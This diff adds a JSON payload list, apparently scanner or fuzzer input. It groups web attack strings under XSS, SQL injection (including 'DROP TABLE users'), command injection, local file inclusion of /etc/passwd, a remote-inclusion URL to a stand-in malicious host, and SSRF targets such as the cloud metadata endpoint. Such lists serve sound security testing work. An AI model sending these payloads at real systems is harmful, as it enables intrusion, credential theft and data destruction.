@@ -1,0 +1,8 @@
+{
+    "XSS": ["<script>alert('xss')</script>", "';alert('xss');//", "<img src=x onerror=alert('xss')>", "javascript:alert(1)"],
+    "SQLi": ["' OR 1=1 --", "1' UNION SELECT NULL, @@version --", "' DROP TABLE users; --", "' AND SLEEP(5) --"],
+    "Command Injection": ["; ls", "&& dir", "| whoami", "; sleep 5"],
+    "LFI": ["../../../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
+    "RFI": ["http://example.com/malicious.php"],
+    "SSRF": ["http://localhost", "file:///etc/hosts", "http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80"]
+}
